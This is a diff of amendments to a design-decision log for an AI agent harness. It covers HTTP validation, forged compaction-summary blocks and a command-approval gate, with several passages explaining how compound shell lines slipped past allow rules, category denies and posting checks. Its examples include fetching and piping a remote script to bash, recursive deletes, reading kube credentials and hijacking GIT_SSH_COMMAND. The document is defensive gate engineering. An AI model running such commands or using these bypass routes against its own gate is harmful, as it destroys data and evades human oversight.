@@ -158,6 +158,16 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   a rewrite with no lifting (throws away Hermes's edge-case fixes and A's 2026 work).
 - **Revisit if:** the lean core misses its wave 1 exit test by more than two waves of effort, or Hermes
   splits out a small, dependency-free core library that Exo could depend on without inheriting the rest.
+- **Amendment 2026-10-21 (#264, W1-6):** exod's HTTP transport answers a bad number in a request with 400 and a
+  JSON `{"error": ...}` body. `Content-Length`, the `since` query value and `Last-Event-ID` must be ASCII digits
+  up to 2^63 - 1, SQLite's largest integer and so the durable event log's bound. Leading zeros are allowed. A
+  bare `int()` read them and the client handler swallowed its `ValueError`, so a word or a float in any of them
+  got no reply, and so did a negative length, which reached `readexactly`. A negative `since` replayed from the
+  start. A `since` past the bound sent the stream's 200 header, then failed in the replay and left its
+  subscription in the hub. A length over 8 MB is still 413 up to the bound, and a 400 past it. The
+  `events.subscribe` command keeps its typed `internal` reply for such a `since`: `GET /events` has no reply
+  envelope, so the bound is checked before the stream opens. A malformed request line still closes the
+  connection with no reply.
 
 - *Amendment 2026-10-20 (#360, continuous interactive turns):* the core loop defaults to `max_iterations=0`, with no
   tool-round cap, so an interactive task can continue beyond 24 rounds until it finishes or a user stop, error or
@@ -716,6 +726,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   reading the stdin source file in the gate (the same folder problem, and a host read before a required worker).
   Limits: `docs/GATE.md` "What an approval covers".
 
+- **Amendment (2026-10-21, #397):** a merge commit's subject and body are posted text.
+  `gh pr merge --subject`/`--body` become the commit message in the repository, public on a public
+  repository, so the posting rules and the scrub see them when a merge carries them, as they have
+  seen a close's comment since #326. A merge carrying neither is unchanged. A reopen's comment is
+  posted text the same way: gh posts it on the thread.
+
 ## D-034 (2026-10-12) Providers setup: one engine, three surfaces, keys write-only
 - **Amendment 2026-10-19 (#271):** provider status rows replace URL userinfo with `***@`, including the rows
   printed by `exo models` and sent to `/providers` and the web. Invalid URLs produce a generic label without
@@ -965,12 +981,12 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   `find -exec`, `uv run` and `$( )` add at the cap reaches the card only when the outer part is benign; adding the
   same part at the `bash -c` cap would change nothing the principal sees. Showing the cap means letting an inner
   summary win ties in `_combine`, a classifier change for its own PR, so that remedy stays open. A category deny under
-  `categories:` fires only when the denied category is the line's most severe part: on a compound line a more severe
-  part takes over and the line asks, and approving it runs the denied action
-  (`gh pr comment 3 --body hi && rm -rf build` is `delete`; #191). An entry in the `deny:` list has matched every part
+  `categories:` then fired only when the denied category was the line's most severe part: on a compound line a more severe
+  part took over and the line asked, and approving it ran the denied action
+  (`gh pr comment 3 --body hi && rm -rf build` is `delete`; lifted by the D-075 amendment for #191, 2026-10-19). An entry in the `deny:` list has matched every part
   the gate reads since D-075, so it denies that line; a `coproc` or `function NAME {` block whose inner command ranks
-  at or below `opaque_exec` splits the same way (denied under `deny: [web_read]`, asked under
-  `categories: {web_read: deny}`). The known unread forms below are allowed outright on main, not asked, and no entry
+  at or below `opaque_exec` split the same way (denied under `deny: [web_read]`; asked under
+  `categories: {web_read: deny}`, lifted by the D-075 amendment for #191, 2026-10-19, to deny as well). The known unread forms below are allowed outright on main, not asked, and no entry
   for the hidden action's category reaches them: `${...}` bodies (#143, open PR #158). Two forms left this list on
   2026-10-19: text piped or fed by heredoc to `ssh` with no remote command (#240), read since #303, and `git clone -c`
   with a command-running key, read as `git -c` is since #231. A `command:`
@@ -1011,11 +1027,11 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   For fed shells and interpreters, a line that was `opaque_exec` takes the inner category
   and carries the issue #178 floor. Only naming `opaque_exec` at `log` or `allow` turns that floor off.
   A `deny: [opaque_exec]` entry still denies these shell and interpreter lines (D-075). Under
-  `categories: {opaque_exec: deny}` or an ordinary rule they now ask where they were denied, as
-  `bash <<EOF` already does, until #191. Fed SQL clients follow their plain-input classification,
+  `categories: {opaque_exec: deny}` or an ordinary rule they then asked where they were denied, as
+  `bash <<EOF` already did (lifted by the D-075 amendment for #191, 2026-10-19). Fed SQL clients follow their plain-input classification,
   without that floor. A compound feeding `\! git push origin main` to `psql` can change from ask
   to the push's `log`. D-075 `deny` and `reserved` entries still match every retained part.
-  Category overrides and ordinary rules use the combined classification. `coproc W { ...; }
+  A category line or rule that denies a part denies the line (#191); other category lines and rules use the combined classification. `coproc W { ...; }
   <<EOF` and `function NAME { ...; } <<EOF` are fed the same way, as #181 reads their bodies; the body of `time { ...;
   }` is not read at all, so it still asks as `opaque_exec`. A closer heredoc wins over a pipe in on stdin only; the
   lexer drops fd numbers, so one on another fd (`{ bash; } 3<<EOF`) is read as stdin: its body is fed, and text piped
@@ -1094,11 +1110,13 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   (`declare -a "b=($(ls 'x' \<newline> -l))"`, only stricter: bash runs the same command). A command the
   line runs only because bash reads a value again also asks through `indirection`, as does an expansion in a `-i` or
   `-n` value, in a `-i` element, or in a compound value the line itself expanded. So when such a command outranks
-  the line's own category, a deny on that category becomes ask, never allow or log
-  (`declare -a 'b=($(sudo ls))' > /tmp/f` under `categories: {local_write: deny}`); D-075 (#126) keeps the deny
-  for the `deny:` list form (#191 tracks the `categories` form). That command also carries the `reread` signal,
+  the line's own category, a deny on that category became ask, never allow or log
+  (`declare -a 'b=($(sudo ls))' > /tmp/f` under `categories: {local_write: deny}`); D-075 (#126) kept the deny
+  for the `deny:` list form, and the D-075 amendment for #191 (2026-10-19) lifted the `categories` form
+  too, so that line denies now. That command also carries the `reread` signal,
   and naming `opaque_exec` does not lower its ask, which stands in for the line's own deny:
-  `{local_write: deny, opaque_exec: allow}` asks too. Past the
+  `{local_write: deny, opaque_exec: allow}` asked too, lifted by the D-075 amendment for #191,
+  2026-10-19, to deny; the line denies now. Past the
   depth limit such a command, or one in a subscript, is an `opaque_exec` part, as on the line itself, with `reread`.
   A plain expansion in a compound element without `-i` (`'b=("$@")'`) is expanded once and asks nothing, and the
   unquoted compound form keeps the line parse's reading. readonly and export never evaluate a name's subscript, so
@@ -1480,6 +1498,23 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   The engine observes pins only from principal-classified text, persists them per session, and merges them at
   compaction and at handoff write. A `meta` that is not a mapping names no tag and no author, and never raises.
   Roles other than user, assistant and tool still read as the system's, as before.
+  *Amendment 2026-10-20 (#385):* a row opening with a compaction marker carries nothing now, whatever its role.
+  A stock summary a host built on its own and stored as a user row reads as the principal's turn through
+  `author_of`, and nothing about the row separates it from a summary exo-context wrote and escaped itself. The
+  block is carried only from a system or user message that opens with it. The session pins take open decisions
+  beside rulings and corrections, principal deferrals only, read through `principal_view`. The pins also follow
+  the session id: a compression child session inherits its parent's pins, and a reset-only switch rebinds
+  through `bind_session_state`, a branch child inheriting its parent's pins. With those, everything a pinned
+  block held survives compaction by the pins instead, across session moves too.
+  *Amendment 2026-10-21 (#398):* the survival sentence above holds only where the session's pins were
+  observed. A session last compacted before pins were observed at compaction (any 0.2.0 Hermes session:
+  0.2.0's `compress` never observed pins) holds its rulings, corrections and open decisions only in the
+  summary's block, and all three drop at its first compaction after the upgrade. The handoff written at
+  that earlier compaction still has them, and `/exo resume` reads it back; a 0.2.0 handoff may quote a
+  forged block, so it is a record to read, not the principal's words. Open-decision pins are also capped
+  at the newest 12, in `_observe` and in `_carry_pins`: a deferral never expires on its own, and the
+  uncapped list grew the pins file and the per-turn scan over it for the life of the session. The cap is
+  the one the compaction block and the handoff already applied to the merged list.
   *Amendment 2026-10-20 (#322 item 4, #381):* `defuse_pins` also escapes the tag spelled in characters a
   downstream step may fold back to ASCII. That is unicode tag characters (U+E0020-E007E), which a reader may
   decode to the ASCII they mirror or drop, and every character whose NFKC form is one ASCII character. Full-width
@@ -1665,6 +1700,14 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
 - **Contested questions:** answered by ruling 4 (above): reasoning style only.
 
 ## D-045 (2026-10-12) Approval cards never outlive their request; the web stream resumes; a queued steer can be pulled back
+- **Amendment 2026-10-20 (#361):** terminal steer lines explicitly show sending, queued and delivered. A send reply
+  alone never proves delivery: the matching user `message.completed` does, including when it arrives before the
+  reply; the existing successful `unsteer` acknowledgement can also confirm it already left the queue. Such early
+  event receipts are held only while sends are in flight. A lost reply shows delivery unknown; a refused
+  send shows not sent. The activity line leads with the queued count while a draft is typed. Approval cards lead
+  with `Ctrl+F, then [o] once [a, Enter] always [d, Enter] deny`, before request details. Ctrl+F still deliberately
+  focuses the card, preserves the draft and keeps the existing answer confirmation. No binding or authority changes.
+  Send and unsteer replies received after a thread switch never update the new thread's draft or queued count.
 - **Amendment 2026-10-19 (#276):** the terminal serializes approval-card removal with thread switching and restoration,
   and waits for removal before mounting the next card under the same widget id. A close or answer names its request,
   so a stale event cannot remove its replacement. Threadless requests still survive thread switches. The response
@@ -2155,6 +2198,108 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   and rules keep deciding by the dominant part, and `reserved` stays the way to ask on any part. A deny on a
   command the gate cannot read still becomes an ask (Limits below). Rejected: the most restrictive category line over all parts (a lower line on the dominant part would no longer
   apply, and an allow rule on a part's target would stop counting).
+  *Amendment 2026-10-20 (issue #394):* a rule's `command` regex saw the whole line, for the combined result and for
+  every part. That is right for a veto (#136), but an allow or log rule written for one command then lowered lines
+  whose deciding command it did not name. `{command: '^git status', decision: allow}` allowed
+  `git status; git push --force origin main`, also under `categories: {force_push: deny}`, although the push alone
+  asks or is denied. In the #191 pass `{command: 'rm -rf build', decision: allow}` lifted
+  `categories: {github_post: deny}` from the post in `gh pr comment 3 --body hi && rm -rf build`. The fix may only
+  make a decision stricter than before or leave it alone, for any line, tool, policy or context, and it does so by
+  construction. A rule keyed on `command` that would lower a compound line must match the line as before, and its
+  regex must also name the line's commands. A rule would lower the line when its decision is below the line's matrix
+  cell and category line (an allow or log rule over an ask cell, an ask rule under a category deny), or when it is an
+  allow or log rule that names `opaque_exec`, which lowers the indirection floor. Its regex must then also match the
+  own text (`Classification.own`) of every part that carries the line's category or is as severe as the combined
+  result, of every other part that alone would get a stricter outcome than the rule gives (a rider), and of every
+  command that changes the shell for later commands on the line (a setter, `Classification.setters`). A rule that
+  fails is passed over and the first-match walk goes on, but the rule step keeps the stricter of the first match, as
+  before, and the rule found after it. A rule passed over never names `opaque_exec` for the floor, and a later rule
+  names it only when the first match does too. In the #191 pass an allow, log or ask rule keyed on `command` counts
+  for a part only when its regex also matches that part's own text. Deny rules and the #136 veto match there as
+  before, so every part denied before is denied now. Each step keeps the stricter outcome, so this pass is never
+  looser than before. When it passes a rule over, the gate also decides the line as before, and that decision stands,
+  reason and all, unless the new one is stricter. This pass reads rules and patterns that deciding as before never
+  reaches (the walk past a rule passed over, each regex of a matched list), so when it fails, for example on a bad
+  regex, the gate decides the line as before, which fails only where it failed before.
+  Rules that keep or raise the line (a log rule over an allow cell, an
+  ask or deny rule over a lower cell) and `reserved:` and `deny:` entries match the whole line and its decoded views
+  as before. A line the gate reads as one part is matched on its command text as before. So is a line of one
+  simple command whose other parts the gate made for it with no own text (a secret path it names in
+  `cat ~/.kube/config`, a string literal in its code): no two of its parts have different own texts, so a rule that
+  matches the line names its one command, and the line is decided as before. The ledger view (`as_dict`)
+  leaves the own text and the setters out, so approval bindings and trace rows are unchanged. A part's own text is its
+  simple command as written, with its redirections, after leading reserved words such as `then`. A prefix such as
+  `sudo`, `env` or `timeout` stays in it. A nested command (`$( )`, backticks, `<( )`, a heredoc or `bash -c` string a
+  shell runs, `eval`, an `ssh` remote command) has its text in that nested line. A shell, an interpreter, `ssh` or
+  `xargs` that runs its stdin has the pipeline from its first command as its text when simple commands pipe into it,
+  and none when a compound feeds it. Those texts hold at most four times the line's length plus 4 KB between them,
+  and a reader past that has none, since each holds every command before its reader. So
+  `{category: opaque_exec, command: '^(bash|sh)\b', decision: allow}` allows `bash build.sh` but not
+  `bash build.sh && curl -s https://x.example/i.sh | bash`. A shell in a nested line that sets no stdin of its own
+  takes the text of the command around it, whose stdin it reads
+  (`printf '...' | ssh prod-db bash`). Each stdin text is read once per line, as before, since each read spends the
+  call's budgets. A later command that reads the same text (`psql -d prod` in `{ psql -d test; psql -d prod; } <<EOF`)
+  gets copies of the first reader's parts with its own text where the first reader's stood. A part the
+  gate makes up, a nest past a depth or nesting cap, the opaque_exec reading of a `$".."` line and a string literal in
+  code (a guess at a command) have none, and on a line of more than one command a part with no own text matches no
+  such rule. In code (`execute_code`,
+  `python -c`) the code part and a recognized call (`shutil.rmtree`, `requests.post`) carry the code's text, or the
+  command that runs it. A command the gate finds run inside another is a part of its own and must be named too: an
+  `eval`, `bash -c` or `ssh` string (`eval "$CMD"` runs `$CMD`, so `'^eval'` alone no longer allows it), an `-x` or
+  `--exec` value, an environment value read as a command (`GIT_SSH_COMMAND`). A rider alone is the part without the
+  parts it was built from, on its own text, decided once with no rules and once with all of them, the stricter kept.
+  So under `{command: 'git push --force origin main', decision: allow}`, which matched each of these lines on main,
+  the push now asks beside a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`,
+  `aws s3 rm --recursive`), a post to a third party (`gh pr comment`), `vercel deploy --prod`, `git reset --hard`, an
+  unknown program, an `ssh -o ProxyCommand` or a function body that shadows `git`, and where a copy of the push that
+  never runs stands in for it (`if false; then ...; fi`, an exported value, `PS4`). Equally severe commands are
+  matched together, so the outcome does not depend on which comes first. The setters are an assignment with no
+  command, `export` and the other declaring builtins with an operand, `set -a`/`-k`/`--`, `shopt -s`, `printf -v`,
+  `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source`, `.`,
+  `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a function definition (no own
+  text) and a program name the gate cannot read. Each is allowed alone, and a bash call starts a fresh shell, so only
+  a later command on the same line sees the change:
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"; git push --force origin main` runs whatever is in /tmp/cmd. Main allowed
+  it under the rule above, and now it asks. `cd` is left off the list, so `cd repo && git push --force origin main`
+  stays allowed under that rule. That cannot loosen a decision, since the rule must still match the whole line:
+  `cd /tmp/evil && make test` asks under `'^make test$'`, as before. An anchored rule such as
+  `'^git push --force origin main$'` still matches no compound line, as before. A rule written for a whole compound
+  line, such as `'^git push origin main && git push origin dev$'`, now also has to name each command, for example as
+  `['^git push origin main && git push origin dev$', '^git push origin (main|dev)$']`, and until it does the line gets
+  its matrix or category outcome (here log).
+  Limits: a command that would be allowed alone still rides on the rule's outcome, as before and as a less severe
+  command does under a category line. `cd /tmp/other && git push --force origin main` and
+  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under the unanchored rule above. A
+  `deny:` or `reserved:` entry, or a category line or rule that denies that command, still stops it. Rejected:
+  matching an allow or log rule on the deciding command's own text instead of the whole line (a draft of this fix). An
+  anchored rule then matched lines it never matched before: `'^make test$'` allowed `cd /tmp/evil && make test`, which
+  runs another Makefile, where main asked, and `'^rm -rf build$'` lifted `categories: {delete: deny}` from
+  `git push --force origin main && rm -rf build`. Also rejected: matching ask and deny rules and the lists on own text
+  instead of the whole line (that narrows a veto: an ask rule on `gh pr comment` would no longer ask for
+  `gh pr comment 3 --body hi && rm -rf build` under `categories: {delete: allow}`), deciding every part alone with the
+  strictest outcome winning (rejected above for category lines), and judging a rider under every rule (a second allow
+  rule would then lower it, so `rm -rf build && git push --force origin main` would pass under two allow rules, one
+  per command, where it asks now).
+  *Amendment 2026-10-21 (issue #396):* the posting checks still read the dominant part only. `decide` ran the
+  footer, the forbidden words and the scrub on the combined result's text, which a compound line takes from its most
+  severe part. So a post that passed, put first, carried a second post past all three. Under footer `F` and the
+  forbidden word `Zork`, `gh pr comment 5 -R myorg/app --body $'ok\nF' && gh pr comment 6 -R myorg/app --body 'Zork'`
+  logged, while the second post alone asks. Now the posting rules read every part. A part is checked, at its own
+  exposure, when its category is under `posting.applies_to` or it is a close or merge carrying text (#326, #397),
+  and it carries text, a title or an unseen body. The dominant part's violations stay bare. Another part's are named
+  after it. A part's unseen body is its own `unseen_body` signal, read from the signals it carried before `_combine`
+  gave it every part's (`Classification.own_signals`, left out of the ledger view). So two unseen posts are both
+  named. Once other parts add violations, a decision lists at most 20 and counts the rest. The dominant part's own
+  violations are always all listed. So is the line-wide unseen-body note for a part the posting rules do not cover.
+  The scrub compiles its patterns once per policy, since a line now runs it once per post. The posting step only
+  adds violations, so no decision is looser than before. The gate differential
+  (#423) bears that out. Over 25,497 actions x 85 policies (the built-in set and nine posting policies) it lowered
+  0 pairs and tightened 1,295, each a `github_post` line going from log or allow to ask. Third-party escalation,
+  the matrix cell and the floors still read the dominant part. So `gh pr comment 5 -R myorg/app --body $'ok\nF' &&
+  gh pr comment 6 -R other/repo --body $'fine\nF'` logs, while the second post alone asks for a third party. That
+  is open as #437. Rejected: checking only the parts under `applies_to` (a close or merge on a compound line would
+  lose #326 and #397), and listing every violation of every post (500 posts gave a 115,000-character reason that
+  the card and the ledger repeat).
 - **Rejected:** denying the line when the combined category is in the list only (the bug); passing the policy into
   `classify` so `_combine` could prefer a denied part (ties classification to one policy, and the plugin decides
   under two policies while a change is pending).
